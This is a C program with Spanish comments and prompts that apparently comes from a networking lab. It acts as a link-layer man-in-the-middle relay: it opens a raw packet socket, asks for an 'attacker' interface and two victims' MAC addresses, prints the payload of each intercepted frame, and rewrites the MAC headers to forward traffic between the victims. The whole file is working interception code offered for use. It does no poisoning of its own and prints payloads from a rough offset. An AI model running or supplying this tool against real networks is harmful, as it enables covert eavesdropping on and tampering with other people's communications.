#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

unsigned char MAC_MIA[6];
unsigned char MAC_A[6];
unsigned char MAC_B[6];
int interfaz_index;

void stringToMac(char *macStr, unsigned char *macBytes) {
    sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &macBytes[0], &macBytes[1], &macBytes[2], 
           &macBytes[3], &macBytes[4], &macBytes[5]);
}

int main() {
    int packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    struct ifreq nic;
    unsigned char buffer[1514];
    char nombre_interfaz[20], mac_a_str[20], mac_b_str[20];

    printf("Interfaz del Atacante (ej. eth0): ");
    scanf("%s", nombre_interfaz);
    printf("MAC de PC A: ");
    scanf("%s", mac_a_str);
    stringToMac(mac_a_str, MAC_A);
    printf("MAC de PC B: ");
    scanf("%s", mac_b_str);
    stringToMac(mac_b_str, MAC_B);

    // Obtener datos de mi propia interfaz
    strcpy(nic.ifr_name, nombre_interfaz);
    ioctl(packet_socket, SIOCGIFINDEX, &nic);
    interfaz_index = nic.ifr_ifindex;
    ioctl(packet_socket, SIOCGIFHWADDR, &nic);
    memcpy(MAC_MIA, nic.ifr_hwaddr.sa_data, 6);

    printf("\n--- MODO MAN-IN-THE-MIDDLE INICIADO ---\n");
    printf("Espiando y reenviando tramas...\n\n");

    struct sockaddr_ll capaEnlace;
    memset(&capaEnlace, 0x00, sizeof(capaEnlace));
    capaEnlace.sll_family = AF_PACKET;
    capaEnlace.sll_ifindex = interfaz_index;

    while (1) {
        memset(buffer, 0, 1514);
        int tam = recvfrom(packet_socket, buffer, 1514, 0, NULL, 0);

        if (tam > 0) {
            // 1. ¿Viene de PC A y es para MI (C)? -> Reenviar a PC B
            if (memcmp(buffer + 6, MAC_A, 6) == 0 && memcmp(buffer, MAC_MIA, 6) == 0) {
                printf("[INTERCEPTADO de A -> B]: %s\n", buffer + 17);
                memcpy(buffer, MAC_B, 6);     // Cambiar destino a B
                memcpy(buffer + 6, MAC_MIA, 6); // Cambiar origen a MI (opcional, pero ayuda al flujo)
                sendto(packet_socket, buffer, tam, 0, (struct sockaddr*)&capaEnlace, sizeof(capaEnlace));
            }
            // 2. ¿Viene de PC B y es para MI (C)? -> Reenviar a PC A
            else if (memcmp(buffer + 6, MAC_B, 6) == 0 && memcmp(buffer, MAC_MIA, 6) == 0) {
                printf("[INTERCEPTADO de B -> A]: %s\n", buffer + 17);
                memcpy(buffer, MAC_A, 6);     // Cambiar destino a A
                memcpy(buffer + 6, MAC_MIA, 6); // Cambiar origen a MI
                sendto(packet_socket, buffer, tam, 0, (struct sockaddr*)&capaEnlace, sizeof(capaEnlace));
            }
        }
    }
    return 0;
}